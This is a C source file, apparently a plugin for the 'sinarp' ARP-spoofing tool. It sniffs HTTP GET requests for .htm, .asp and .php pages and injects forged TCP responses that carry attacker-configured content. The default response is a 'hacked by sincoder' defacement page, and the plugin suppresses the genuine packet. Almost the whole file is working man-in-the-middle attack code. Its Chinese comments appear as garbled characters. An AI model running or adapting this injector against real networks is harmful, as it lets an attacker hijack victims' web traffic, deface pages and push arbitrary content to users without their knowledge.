#define  _WSPIAPI_COUNTOF
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//#include <strings.h>
#include <pcap.h>
#include "../../sinarp.h"
#ifdef WIN32
#pragma comment(lib,"../../bin/sinarp.lib")
#pragma comment(lib,"ws2_32.lib")
#define strncasecmp strnicmp
#endif

char  g_http_default_response[] = { "HTTP/1.1 200 OK\r\n"\
"Server: Apache/2.2.22 (Win32) PHP/5.3.13\r\n"\
"X-Powered-By: PHP/5.3.13\r\n"\
"Content-Length: 1000\r\n"\
"Connection: Close\r\n"\
"Content-Type: text/html\r\n\r\n"\
"http://$_host_$/$_url_$ is hacked by sincoder !!!!" };

char *g_filter_url = NULL;	//Ҫ���˵� url ֻ������һ�� Ϊ��Ч��
char *g_filter_host = NULL;	//Ҫ���˵� host Ҳ��ֻ������һ��

typedef struct _filter_pix
{
	uint32 pix;
	struct _filter_pix *next;
}filter_pix;
filter_pix *g_filter_pix = NULL;

char g_http_response[65535] = { 0 };
uint32 g_response_len = 0;
char g_url[65535] = { "I am url " }; //
uint32 g_url_len = 0;
char g_host[65535] = { "I am host" }; //
uint32 g_host_len = 0;
//pcap_t  **g_adhandle;
uint32 *g_url_offset_list = NULL;
uint32 g_url_offset_count = 0;
uint32 *g_host_offset_list = NULL;
uint32 g_host_offset_count = 0;
uint32 g_need2build_http_response = 0; //�ǲ�����Ҫ���� http ���ص� string ..��http����ͷ���治���� $_url_$ $_host_$��ʱ��Ͳ���Ҫ����

typedef enum _string_type
{
	STRING_URL = 0x1,
		STRING_HOST,
		STRING_NORMAL
}string_type;

typedef struct _response_string_list
{
	char *pstr;
	uint32 length;
	string_type type;
	struct _response_string_list *next;
}response_string_list;

response_string_list *g_string_list = NULL;

void insert_into_list(char *str, string_type type)
{
	response_string_list *p;
	if (*str == 0) return;
	if (g_string_list == NULL)
	{
		g_string_list = (response_string_list *)malloc(sizeof(response_string_list));
		g_string_list->type = type;
		g_string_list->pstr = strdup(str);
		g_string_list->length = strlen(str);
		g_string_list->next = NULL;
		return;
	}
	p = g_string_list;
	while (p->next)	p = p->next;
	p->next = ( response_string_list *)malloc(sizeof(response_string_list));
	p = p->next;
	p->type = type;
	p->length = strlen(str);
	p->pstr = strdup(str);
	p->next = NULL;
}

void free_response_string_list()
{
	response_string_list *p = g_string_list;
	while (p)
	{
		free(p->pstr);
		g_string_list = p->next;
		free(p);
		p = g_string_list;
	}
}

BOOL parse_response_string()
{
	char *p1, *p2;
	char buff[65535];
	p1 = p2 = g_http_response;
	
	while (*p1)
	{
		if (*p1 == '$')
		{
			if (strncasecmp(p1, "$_url_$", 7) == 0)
			{
				g_need2build_http_response = 1;
				memcpy(buff, p2, p1 - p2);
				buff[p1 - p2] = 0;
				insert_into_list(buff, STRING_NORMAL);
				insert_into_list(g_url, STRING_URL);
				p1 += 7;
				p2 = p1;
				continue;
			}
			else if (strncasecmp(p1, "$_host_$", 8) == 0)
			{
				g_need2build_http_response = 1;
				memcpy(buff, p2, p1 - p2);
				buff[p1 - p2] = 0;
				insert_into_list(buff, STRING_NORMAL);
				insert_into_list(g_host, STRING_HOST);
				p1 += 8;
				p2 = p1;
				continue;
			}
		}
		++p1;
	}
	memcpy(buff, p2, p1 - p2);
	buff[p1 - p2] = 0;
	insert_into_list(buff, STRING_NORMAL);
	return TRUE;
}

/*
buffer Ҫ���������
count ����������Ԫ�ص�����
size_of_node ÿ��Ԫ��ռ���ֽ���
*/
uint32 insert_into_uint32_buffer(uint32 **buffer, uint32 *count, uint32 value)
{
	uint32 *ptemp_list = *buffer;
	if (ptemp_list == NULL)
	{
		ptemp_list = (uint32 *)malloc(sizeof(uint32));
		++*count;
	}
	else
	{
		ptemp_list = (uint32 *)malloc((*count + 1) * sizeof(uint32));
		memcpy(ptemp_list, *buffer, *count * sizeof(uint32));
		free(*buffer);
		*buffer = ptemp_list;
		ptemp_list = *buffer + *count;
		++*count;
	}
	*ptemp_list = value;
	//memcpy(ptemp_list,&plugin,sizeof(plugin_info));

	return 0;
}


/*
���ַ����ĳ��ȷ��ء�����
*/
uint32 build_response_string()
{
	uint32 offset = 0;
	response_string_list *p = g_string_list;
	while (p)
	{
		switch (p->type)
		{
		case STRING_NORMAL:
			{
				memcpy(g_http_response + offset, p->pstr, p->length);
				offset += p->length;
			}
			break;
		case STRING_URL:
			{
				//sinarp_printf("\ncopy  url : %s \n",g_url);
				memcpy(g_http_response + offset, g_url, g_url_len);
				offset += g_url_len;
			}
			break;
		case STRING_HOST:
			{
				memcpy(g_http_response + offset, g_host, g_host_len);
				offset += g_host_len;
			}
			break;
		default:
			break;
		}
		p = p->next;
	}
	g_http_response[offset] = 0;
	//sinarp_printf("\nresponse : %s \n",g_http_response);
	return offset;
}

/*
�� http ͷ��������õ� url  host 
���紫�� 
GET /fuck http/1.1\r\n
HOST:fuck.com\r\n\r\n
��ô��õ� url = /fuck  host =fuck.com
����������û�з��� host ��ôӦ���Է�������ip��Ϊ host

*/
BOOL get_url_host_from_http_header(const char *http, uint32 http_len)
{
	uint32 url_offset;
	uint32 host_offset;
	const char *p = http;
	g_url_len = url_offset = g_host_len = host_offset = 0;
	g_url[0] = 0;
	g_host[0] = 0;
	p += 4;	//skip GET
	while (p - http < http_len)
	{
		if (*p == '/') goto next1;
		++p;
	}
	return FALSE;
next1:
	++p; //skip /
	while (*p == ' ') ++p; //ȥ���ո�
	url_offset = p - http; //find start of url
	while (p - http < http_len && *p != ' ' && *p != '\r')
	{
		++p;
		++g_url_len;
	}
	if (g_url_len > 0)
	{
		memcpy(g_url, http + url_offset, g_url_len);
		g_url[g_url_len] = 0;
	}
	if (*p == ' ')
	{
		//���� ���������� host
		while (p + 4 - http < http_len)
		{
			//Ҫ��Ҫֻ ���� Host:��һ����� ���� �����������ӵ�  Host: 0x74736F48
			if (*(uint32 *)(p - 4) == 0x74736F48 && *p == ':') break;
			++p;
		}
		if (p + 4 - http < http_len)
		{
			p += 1;	// skip :
			while (*p == ' ') ++p;
			host_offset = p - http;	//�ҵ���ͷ�ˡ���
			while (p - http < http_len && *p != ' ' && *p != '\r')
			{
				++g_host_len;
				++p;
			}
			if (g_host_len > 0)
			{
				memcpy(g_host, http + host_offset, g_host_len);
				g_host[g_host_len] = 0;
				return TRUE; //ȫ�����ҵ��� �ŷ��� TRUE
			}
		}
		else
		{
			//û�ҵ� host
			return FALSE;
		}
	}
	else // �ҵ����Ľ�β��
	{
		return FALSE;
	}
	return FALSE;
}

BOOL process_packet(ETHeader *ethdr, uint32 len)
{
	IPHeader *iphdr = (IPHeader *)(((uint8 *)ethdr) + 14);
	uint32 ip_len, data_len;
	uint8 *data_offset;
	uint32 pro_len;
	uint16 sport, dport;
	TCPHeader *tcphdr;
	UDPHEADER *udphdr;
	//  for http inject
	uint8 *pFlag = NULL;
	uint8 spoof_packet[1500];
	uint32 spoof_packet_len;
	uint32 pix;
	filter_pix *pix_list;
	//uint32 g_response_len = 0;
	ip_len = (iphdr->iphVerLen & 0xf) * sizeof(unsigned long);
	if (iphdr->ipProtocol == PROTO_TCP)
	{
		// �ҵ�TCP��λ��
		tcphdr = (TCPHeader *)((u_char *)iphdr + ip_len);
		pro_len = ((tcphdr->dataoffset >> 4) * sizeof(unsigned long));
		sport = ntohs(tcphdr->sourcePort);
		dport = ntohs(tcphdr->destinationPort);
		
		//printf("%s \n",(unsigned char *)iphdr + ip_len + pro_len);
	}
	else if (iphdr->ipProtocol == PROTO_UDP)
	{
		// �ҵ�UDP��λ��
		udphdr = (UDPHEADER *)((u_char *)iphdr + ip_len);
		pro_len = ntohs(udphdr->uh_len);
		sport = ntohs(udphdr->uh_sport);
		dport = ntohs(udphdr->uh_dport);
	}
	else
	{
		//����ʶ�Ķ���
		return TRUE;
	}
	// ���ݳ���
	data_len = ntohs(iphdr->ipLength) - (ip_len + pro_len);
	// ָ�����ݵ�ָ��
	data_offset = (unsigned char *)iphdr + ip_len + pro_len;
	
	switch (iphdr->ipProtocol)
	{
	case PROTO_TCP:
		{
			//�ظ�  һ���� ����  ������ �������Ļ� ��ô���ŶϿ�����
			/*
			Accept text/html,application/xhtml+xml,application/xml;q=0.9,
			0x20544547  "GET "
			IE  ����� �ӵ��� ����ͼƬɶ�� ���� accept: * / *
			���ǻ��ǲ��� .html 
			*/
			//ֻ���� GET ����
			if (data_len > 20 && (*(uint32 *)data_offset) == 0x20544547) //"GET "
			{
			/*
			���ݵĴ���Ҫ��ǳ�����
			ֻ��עָ������ҳ .htm .asp .php .jsp  
			.htm --> 0x6D74682E
			.asp --> 0x7073612E
			.php --> 0x7068702E
			.jsp <-- ����������  �о�̫���� 
			ò���Ǹ� Js Ҳ��Ҫ���Ƕ�̬�ĸ�д ���õ��� ���ʵ���ҳ
				*/
				pFlag = (uint8 *)sinarp_memfind(data_offset, data_len, "=s1Nc0d3r", 9, NULL, TRUE);	//���Ҳ����ʶ
				if (pFlag == NULL) //û�ҵ���ʶ��ô�ͽ�����ƭ
				{
					pFlag = data_offset;
					while (*pFlag)
					{
						if (*pFlag == '.')
						{
							pix = *(uint32 *)pFlag;
							//��ʼ�Ա�
							if (g_filter_pix == NULL) //ʹ��Ĭ�ϵĹ��˺�׺
							{
								if (pix == 0x6D74682E || pix == 0x7073612E || pix == 0x7068702E)
								{
									//�ҵ���
									goto spoof;
								}
							}
							else
							{
								//ʹ�ú�׺������ĺ�׺���бȶԡ�
								pix_list = g_filter_pix;
								while (pix_list)
								{
									if (pix == pix_list->pix) goto spoof;
									pix_list = pix_list->next;
								}
								return TRUE; //û�ҵ�ֱ�ӷ���
							}
						}
						else if (*pFlag == '\r') break;
						else if (*pFlag == '/' && *(pFlag + 1) == ' ')
						{
							//���� ��ҳ ���� һ��Ŀ¼
							goto spoof;
						}
						pFlag++;
					}
					return TRUE;
spoof:
					get_url_host_from_http_header((char *)data_offset, len);
					if (g_host[0] && g_url[0])
					{
						//���� url �� host ����
						if (g_filter_url)
						{
							if (strcmp(g_url, g_filter_url) != 0)
							{
								return TRUE;
							}
						}
						if (g_filter_host)
						{
							if (strcmp(g_host, g_filter_host) != 0)	return TRUE;
						}
						//sinarp_printf("\n %s %s %u %u \n",g_host,g_url,g_host_len,g_url_len);
						if (g_need2build_http_response)	g_response_len = build_response_string();
						//else
						//{
						//	response_len = strlen(g_http_response);  //��������Ż���
						//}
						sinarp_build_tcp_response_packet(ethdr, spoof_packet, &spoof_packet_len, (uint8 *)g_http_response, g_response_len);
						if (pf_pcap_sendpacket(g_adhandle, spoof_packet, spoof_packet_len) < 0)
						{
							printf("\r[!] http_injector: send packet failed !\r\n");
							return TRUE;  //���ϼ�ת�����ݰ�
						}
						sinarp_printf("\r\nInject OK : %s --> %s http://%s/%s \n",
							sinarp_iptos(iphdr->ipSource),
							sinarp_iptos(iphdr->ipDestination),
							g_host,
							g_url);
						return FALSE;  //��ת��������ݰ�
					}
					return TRUE; //���ϼ�ת��������ݰ�
				}
			}
		}
		break;
	case PROTO_UDP:
		{}
		break;
	default:
		break;
	}
	return TRUE;
}

BOOL plugin_init()
{
	//HANDLE hfile;
	//HMODULE hexe;
	uint8 *config_data;
	uint32 dwBytes = 0;
	char buff[65535] ={0};
	char value[65535] = {0};
	const char *p1, *p2;
	char pix[10];
	filter_pix *pfilter = NULL;
	
	sinarp_printf("%s", "http inject plugin load ...\n");
	//�� �ļ��ж�ȡҪ���ص����ݰ�
	sinarp_printf("%s", "read config file..\n");
	
	//hfile = CreateFileA("http.sin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	config_data = sinarp_load_file_into_mem("http.sin");
	if (config_data == NULL)
	{
		sinarp_printf("load config file failed,use default \n");
		g_http_response[0] = 0;
		strcpy(g_http_response, g_http_default_response);
	}
	else
	{
		sinarp_printf("%s   \n ",config_data);

		strcpy((char *)buff,(char *)config_data);

		//free(config_data);

		if (sinarp_find_string_by_flag(buff, "suffix = [", "]", value, 65535))	//���û��ָ�� ʹ�����õ�����
		{
			//	if(value[0] != '*')
			//	{
			p1 = value;
			while ((p1 = sinarp_take_out_string_by_char(p1, pix, 10, ',')))
			{
				//sinarp_printf("--%s--",pix);
				if (g_filter_pix == NULL)
				{
					g_filter_pix = (filter_pix *)malloc(sizeof(filter_pix));
					g_filter_pix->next = NULL;
					pfilter = g_filter_pix;
				}
				else
				{
					pfilter = g_filter_pix;
					while (pfilter->next) pfilter = pfilter->next;
					pfilter->next = (filter_pix *)malloc(sizeof(filter_pix));
					pfilter = pfilter->next;
				}
				pfilter->next = NULL;
				pfilter->pix = *(uint32 *)pix;
			}
			//	}
		}
		if (sinarp_find_string_by_flag(buff, "url = [", "]", value, 65535))
		{
			if (value[0] != '*') g_filter_url = strdup(value);
		}
		if (sinarp_find_string_by_flag(buff, "host = [", "]", value, 65535))
		{
			if (value[0] != '*') g_filter_host = strdup(value);
		}
		if (sinarp_find_string_by_flag(buff, "response = [", "]", value, 65535))
		{
			g_http_response[0] = 0;
			strcpy(g_http_response, value);
			g_response_len = strlen(g_http_response) + 1;
			//sinarp_printf("%s",g_http_response);
		}
	}
	//��ӡ��������Ϣ
	pfilter = g_filter_pix;
	if (pfilter)
	{
		sinarp_printf("filted pix:\n");
		while (pfilter)
		{ //Ҫ���˵ĺ�׺
			*(uint32 *)value = pfilter->pix;
			value[4] = 0;
			sinarp_printf("\t%s\n", value);
			pfilter = pfilter->next;
		}
	}
	else
	{
		sinarp_printf("do not indicate pix use default: .asp .php .htm\n");
	}
	if (g_filter_url) sinarp_printf("filted url:%s\n", g_filter_url);
	if (g_filter_host) sinarp_printf("filted host:%s\n", g_filter_host);
	parse_response_string();
	
	return TRUE;
}


void *plugin_unload()
{
	filter_pix *pfilter = NULL;
	free_response_string_list();
	if (g_filter_host) free(g_filter_host);
	if (g_filter_url) free(g_filter_url);
	if (g_filter_pix)
	{
		pfilter = g_filter_pix;
		while (g_filter_pix)
		{
				pfilter = g_filter_pix->next;
				free(g_filter_pix);
				g_filter_pix = pfilter;
		}
	}
	return NULL;
}


/*

  BOOL __stdcall DllMain(HANDLE hDllHandle, DWORD dwReason, LPVOID lpreserved)
  {
  HANDLE hfile;
  HMODULE hexe;
  DWORD dwBytes = 0;
  char buff[65535];
  char value[65535];
  const char *p1, *p2;
  char pix[10];
  filter_pix *pfilter = NULL;
  
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
	{
	sinarp_printf("%s", "http inject plugin load ...\n");
	//�� �ļ��ж�ȡҪ���ص����ݰ�
	sinarp_printf("%s", "read config file..\n");
	hfile = CreateFileA("http.sin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
	{
				sinarp_printf("load config file failed,use default \n");
				g_http_response[0] = 0;
				strcpy(g_http_response, g_http_default_response);
				}
				else
				{
				ReadFile(hfile, buff, 65535, &dwBytes, NULL);
				if (dwBytes < 1)
				{
				sinarp_printf("\nread file failed !\nuse default config~~\n");
				g_http_response[0] = 0;
				strcpy(g_http_response, g_http_default_response);
				}
				CloseHandle(hfile);
				}
				hexe = GetModuleHandle(NULL);
				g_adhandle = (pcap_t **)GetProcAddress(hexe, "g_adhandle");
				
				  //��ʼ���������ļ�
				  if (dwBytes > 1)
				  {
				  if (sinarp_find_string_by_flag(buff, "suffix = [", "]", value, 65535))	//���û��ָ�� ʹ�����õ�����
				  {
				  //	if(value[0] != '*')
				  //	{
				  p1 = value;
				  while ((p1 = sinarp_take_out_string_by_char(p1, pix, 10, ',')))
				  {
				  //sinarp_printf("--%s--",pix);
				  if (g_filter_pix == NULL)
				  {
				  g_filter_pix = (filter_pix *)malloc(sizeof(filter_pix));
				  g_filter_pix->next = NULL;
				  pfilter = g_filter_pix;
				  }
				  else
				  {
				  pfilter = g_filter_pix;
				  while (pfilter->next) pfilter = pfilter->next;
				  pfilter->next = (filter_pix *)malloc(sizeof(filter_pix));
				  pfilter = pfilter->next;
				  }
				  pfilter->next = NULL;
				  pfilter->pix = *(uint32 *)pix;
				  }
				  //	}
				  }
				  if (sinarp_find_string_by_flag(buff, "url = [", "]", value, 65535))
				  {
				  if (value[0] != '*') g_filter_url = strdup(value);
				  }
				  if (sinarp_find_string_by_flag(buff, "host = [", "]", value, 65535))
				  {
				  if (value[0] != '*') g_filter_host = strdup(value);
				  }
				  if (sinarp_find_string_by_flag(buff, "response = [", "]", value, 65535))
				  {
				  g_http_response[0] = 0;
				  strcpy(g_http_response, value);
				  g_response_len = strlen(g_http_response) + 1;
				  //sinarp_printf("%s",g_http_response);
				  }
				  }
				  //��ӡ��������Ϣ
				  pfilter = g_filter_pix;
				  if (pfilter)
				  {
				  sinarp_printf("Ҫ���˵ĺ�׺:\n");
				  while (pfilter)
				  { //Ҫ���˵ĺ�׺
				  *(uint32 *)value = pfilter->pix;
				  value[4] = 0;
				  sinarp_printf("\t%s\n", value);
				  pfilter = pfilter->next;
				  }
				  }
				  else
				  {
				  sinarp_printf("δָ�����˺�׺ ʹ��Ĭ�ϵ� .asp .php .htm\n");
				  }
				  if (g_filter_url) sinarp_printf("Ҫ���˵�url:%s\n", g_filter_url);
				  if (g_filter_host) sinarp_printf("Ҫ���˵�host:%s\n", g_filter_host);
				  parse_response_string();
				  }
				  break;
				  case DLL_PROCESS_DETACH:
				  {
				  free_response_string_list();
				  if (g_filter_host) free(g_filter_host);
				  if (g_filter_url) free(g_filter_url);
				  if (g_filter_pix)
				  {
				  pfilter = g_filter_pix;
				  while (g_filter_pix)
				  {
				  pfilter = g_filter_pix->next;
				  free(g_filter_pix);
				  g_filter_pix = pfilter;
				  }
				  }
				  }
				  break;
				  default:
				  break;
				  }
				  return TRUE;
				  }
				  
					
*/